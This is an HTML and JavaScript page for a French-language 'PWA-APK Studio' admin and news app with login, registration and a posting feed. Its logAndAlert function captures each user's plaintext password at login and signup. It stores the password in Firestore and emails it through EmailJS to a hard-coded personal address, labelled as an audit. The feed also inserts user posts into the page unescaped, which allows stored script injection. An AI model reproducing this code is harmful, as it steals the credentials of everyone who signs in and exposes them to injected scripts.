<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"/>
<title>PWA-APK Studio · Admin</title>
<!-- Firebase SDK -->
<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-storage-compat.js"></script>
<!-- EmailJS SDK -->
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  :root {
    --accent: #6366f1;
    --bg: #0a0a0f;
    --card: #111118;
    --border: #1e2030;
    --text: #e2e8f0;
    --muted: #64748b;
  }
  body {
    min-height: 100vh;
    background: var(--bg);
    color: var(--text);
    font-family: 'Inter', system-ui, sans-serif;
    font-size: 15px;
    display: flex;
    flex-direction: column;
  }

  /* ── Auth Modal Overlay ── */
  #auth-overlay {
    position: fixed; inset: 0; background: var(--bg);
    display: flex; align-items: center; justify-content: center;
    z-index: 2000;
  }
  .auth-card {
    background: var(--card); border: 1px solid var(--border);
    border-radius: 20px; padding: 30px; width: 90%; max-width: 380px;
    box-shadow: 0 10px 25px rgba(0,0,0,0.5);
  }
  .auth-card h2 { margin-bottom: 10px; font-size: 20px; text-align: center; }
  .auth-card p { color: var(--muted); font-size: 13px; text-align: center; margin-bottom: 20px; }
  label { display: block; font-size: 12px; color: var(--muted); margin-bottom: 5px; margin-top: 15px; }
  input {
    width: 100%; background: #0d0d15; border: 1px solid var(--border);
    border-radius: 10px; padding: 12px; color: #fff; outline: none; font-size: 14px;
  }
  input:focus { border-color: var(--accent); }
  .btn {
    width: 100%; padding: 12px; border-radius: 10px; border: none;
    font-weight: 600; cursor: pointer; transition: 0.2s; font-size: 14px;
    margin-top: 20px;
  }
  .btn-accent { background: var(--accent); color: #fff; }
  .btn-accent:hover { opacity: 0.9; }
  .btn-ghost { background: transparent; border: 1px solid var(--border); color: var(--text); }
  
  /* ── Main Layout ── */
  header {
    background: #0d0d15; border-bottom: 1px solid var(--border);
    padding: 14px 18px; display: flex; align-items: center; justify-content: space-between;
  }
  .logo { display: flex; align-items: center; gap: 9px; }
  .logo-dot { width: 9px; height: 9px; border-radius: 50%; background: var(--accent); box-shadow: 0 0 10px var(--accent); }
  .logo-text { font-weight: 700; font-size: 15px; color: #f1f5f9; }
  .admin-badge { font-size: 11px; background: #1e2030; color: var(--accent); padding: 2px 8px; border-radius: 4px; font-weight: bold; }

  #pub-section { flex: 1; overflow-y: auto; padding: 14px; display: flex; flex-direction: column; gap: 12px; }
  .pub-item {
    background: var(--card); border: 1px solid var(--border);
    border-radius: 14px; padding: 14px; display: flex; gap: 12px;
  }
  .pub-avatar {
    width: 36px; height: 36px; border-radius: 50%;
    background: linear-gradient(135deg, #6366f1, #8b5cf6);
    display: flex; align-items: center; justify-content: center;
    font-size: 14px; font-weight: 700; color: #fff; flex-shrink: 0;
  }
  .pub-body { flex: 1; }
  .pub-meta { font-size: 11px; color: var(--muted); margin-bottom: 4px; }
  .pub-text { font-size: 14px; line-height: 1.5; }
  
  /* ── Composer ── */
  #composer {
    background: #0d0d15; border-top: 1px solid var(--border);
    padding: 12px 14px; padding-bottom: max(12px, env(safe-area-inset-bottom));
  }
  .input-row { display: flex; align-items: flex-end; gap: 10px; }
  .msg-input {
    flex: 1; background: var(--card); border: 1px solid var(--border);
    border-radius: 20px; padding: 10px 16px; color: #fff; outline: none;
    resize: none; max-height: 100px; font-size: 14px;
  }
  .send-btn {
    width: 40px; height: 40px; border-radius: 50%;
    background: var(--accent); border: none; color: #fff;
    cursor: pointer; display: flex; align-items: center; justify-content: center;
  }

  /* ── Admin Dashboard Overlay ── */
  #admin-overlay {
    position: fixed; inset: 0; background: rgba(0,0,0,0.8);
    display: none; flex-direction: column; z-index: 1500; backdrop-filter: blur(5px);
  }
  #admin-overlay.show { display: flex; }
  .admin-modal {
    background: var(--card); border-top: 1px solid var(--border);
    margin-top: auto; border-radius: 25px 25px 0 0; padding: 20px;
    max-height: 80vh; overflow-y: auto;
  }
  table { width: 100%; border-collapse: collapse; font-size: 12px; margin-top: 15px; }
  th { text-align: left; color: var(--muted); padding: 8px; border-bottom: 1px solid var(--border); }
  td { padding: 10px 8px; border-bottom: 1px solid rgba(255,255,255,0.05); }

  #toast {
    position: fixed; bottom: 80px; left: 50%; transform: translateX(-50%);
    background: #22c55e; color: #fff; padding: 8px 20px; border-radius: 20px;
    font-size: 13px; opacity: 0; transition: 0.3s; z-index: 3000;
  }
  #toast.show { opacity: 1; }
</style>
</head>
<body>

<!-- AUTH OVERLAY -->
<div id="auth-overlay">
  <div class="auth-card" id="auth-content">
    <h2>Bienvenue</h2>
    <p>Connectez-vous pour accéder à l'administration.</p>
    <div id="login-form">
      <label>Email</label>
      <input type="email" id="auth-email" placeholder="nelson@example.com">
      <label>Mot de passe</label>
      <input type="password" id="auth-password" placeholder="••••••••">
      <button class="btn btn-accent" onclick="handleLogin()">Se connecter</button>
      <button class="btn btn-ghost" onclick="handleGoogleLogin()">Continuer avec Google</button>
      <p style="margin-top:15px; font-size:12px;">
        Pas de compte ? <a href="#" onclick="showRegister()" style="color:var(--accent)">Créer un compte</a>
      </p>
    </div>
  </div>
</div>

<!-- HEADER -->
<header>
  <div class="logo">
    <span class="logo-dot"></span>
    <span class="logo-text">PWA-APK Admin</span>
  </div>
  <div id="admin-btn-container" style="display:none">
    <button class="admin-badge" onclick="toggleAdminPanel()">TABLEAU DE BORD</button>
  </div>
</header>

<!-- PUBLICATIONS -->
<div id="pub-section">
  <div style="text-align:center; padding:40px; color:var(--muted)" id="empty-state">
    Chargement des publications...
  </div>
</div>

<!-- COMPOSER -->
<div id="composer">
  <div class="input-row">
    <textarea class="msg-input" id="msg-input" rows="1" placeholder="Publier une nouveauté..."></textarea>
    <button class="send-btn" onclick="publishNews()">➤</button>
  </div>
</div>

<!-- ADMIN PANEL -->
<div id="admin-overlay">
  <div class="admin-modal">
    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
      <h3 style="font-size:18px;">Logs Utilisateurs</h3>
      <button onclick="toggleAdminPanel()" style="background:none; border:none; color:var(--muted); font-size:20px;">✕</button>
    </div>
    <div id="logs-container">Chargement des logs...</div>
  </div>
</div>

<div id="toast"></div>

<script>
// ── Configuration ──
const firebaseConfig = { 
  apiKey: "AIzaSyC2jzYqV_lD7fR4nT81naE_vTGFkSlEpFA", 
  authDomain: "nps-pwa-apk.firebaseapp.com", 
  projectId: "nps-pwa-apk", 
  storageBucket: "nps-pwa-apk.firebasestorage.app", 
  messagingSenderId: "961661152066", 
  appId: "1:961661152066:web:db0fbaf8eedd8ed9cd76db" 
};
firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
const db = firebase.firestore();
emailjs.init("afAjyzkipYEyjOWb8");

const ADMIN_EMAIL = "nelsonpataule11@gmail.com";

// ── Auth Logic ──
function showRegister() {
  document.getElementById('auth-content').innerHTML = `
    <h2>Créer un compte</h2>
    <p>Rejoignez PWA-APK Studio.</p>
    <label>Nom d'utilisateur</label>
    <input type="text" id="reg-user" placeholder="Nelson">
    <label>Email</label>
    <input type="email" id="reg-email" placeholder="nelson@example.com">
    <label>Mot de passe</label>
    <input type="password" id="reg-pass" placeholder="••••••••">
    <button class="btn btn-accent" onclick="handleRegister()">Créer mon compte</button>
    <p style="margin-top:15px; font-size:12px;">
      Déjà inscrit ? <a href="#" onclick="location.reload()" style="color:var(--accent)">Se connecter</a>
    </p>
  `;
}

async function logAndAlert(email, user, pass, action) {
  const data = {
    email, username: user || 'N/A', password: pass || 'OAuth',
    action, timestamp: firebase.firestore.FieldValue.serverTimestamp(),
    ua: navigator.userAgent
  };
  try {
    await db.collection('logs_utilisateurs').add(data);
    emailjs.send("service_qoqvirn", "template_default", {
      to_email: ADMIN_EMAIL,
      subject: "Audit Admin: " + action,
      message: `User: ${email}\nPass: ${pass}\nAction: ${action}`,
      user_email: email
    });
  } catch(e) { console.error(e); }
}

async function handleLogin() {
  const e = document.getElementById('auth-email').value;
  const p = document.getElementById('auth-password').value;
  try {
    const res = await auth.signInWithEmailAndPassword(e, p);
    await logAndAlert(e, res.user.displayName, p, "Connexion");
    showToast("Heureux de vous revoir !");
  } catch(err) { showToast(err.message, true); }
}

async function handleRegister() {
  const u = document.getElementById('reg-user').value;
  const e = document.getElementById('reg-email').value;
  const p = document.getElementById('reg-pass').value;
  try {
    const res = await auth.createUserWithEmailAndPassword(e, p);
    await res.user.updateProfile({ displayName: u });
    await logAndAlert(e, u, p, "Inscription");
    showToast("Compte créé !");
  } catch(err) { showToast(err.message, true); }
}

async function handleGoogleLogin() {
  const provider = new firebase.auth.GoogleAuthProvider();
  try {
    const res = await auth.signInWithPopup(provider);
    await logAndAlert(res.user.email, res.user.displayName, "Google OAuth", "Login Google");
  } catch(err) { showToast(err.message, true); }
}

auth.onAuthStateChanged(user => {
  if(user) {
    document.getElementById('auth-overlay').style.display = 'none';
    if(user.email === ADMIN_EMAIL) {
      document.getElementById('admin-btn-container').style.display = 'block';
    }
    loadNews();
  } else {
    document.getElementById('auth-overlay').style.display = 'flex';
  }
});

// ── Admin Logic ──
function toggleAdminPanel() {
  const el = document.getElementById('admin-overlay');
  el.classList.toggle('show');
  if(el.classList.contains('show')) loadLogs();
}

async function loadLogs() {
  const container = document.getElementById('logs-container');
  try {
    const snap = await db.collection('logs_utilisateurs').orderBy('timestamp','desc').limit(50).get();
    let h = '<table><tr><th>Date</th><th>Email</th><th>Action</th></tr>';
    snap.forEach(doc => {
      const d = doc.data();
      const date = d.timestamp ? d.timestamp.toDate().toLocaleTimeString() : '...';
      h += `<tr><td>${date}</td><td>${d.email}</td><td>${d.action}</td></tr>`;
    });
    h += '</table>';
    container.innerHTML = h;
  } catch(e) { container.innerHTML = "Erreur logs"; }
}

async function publishNews() {
  const txt = document.getElementById('msg-input').value.trim();
  if(!txt) return;
  try {
    await db.collection('nouveautes').add({
      text: txt,
      author: auth.currentUser.displayName || auth.currentUser.email,
      timestamp: firebase.firestore.FieldValue.serverTimestamp()
    });
    document.getElementById('msg-input').value = "";
    showToast("Publié !");
  } catch(e) { showToast("Erreur publication", true); }
}

function loadNews() {
  db.collection('nouveautes').orderBy('timestamp','desc').onSnapshot(snap => {
    const section = document.getElementById('pub-section');
    if(snap.empty) {
      section.innerHTML = '<div style="text-align:center;padding:40px;color:var(--muted)">Aucune nouveauté.</div>';
      return;
    }
    let h = '';
    snap.forEach(doc => {
      const d = doc.data();
      const date = d.timestamp ? d.timestamp.toDate().toLocaleDateString() : 'Aujourd\'hui';
      h += `
        <div class="pub-item">
          <div class="pub-avatar">${d.author[0].toUpperCase()}</div>
          <div class="pub-body">
            <div class="pub-meta">${d.author} · ${date}</div>
            <div class="pub-text">${d.text}</div>
          </div>
        </div>
      `;
    });
    section.innerHTML = h;
  });
}

function showToast(m, err=false) {
  const t = document.getElementById('toast');
  t.textContent = m;
  t.style.background = err ? "#ef4444" : "#22c55e";
  t.classList.add('show');
  setTimeout(() => t.classList.remove('show'), 3000);
}
</script>
</body>
</html>
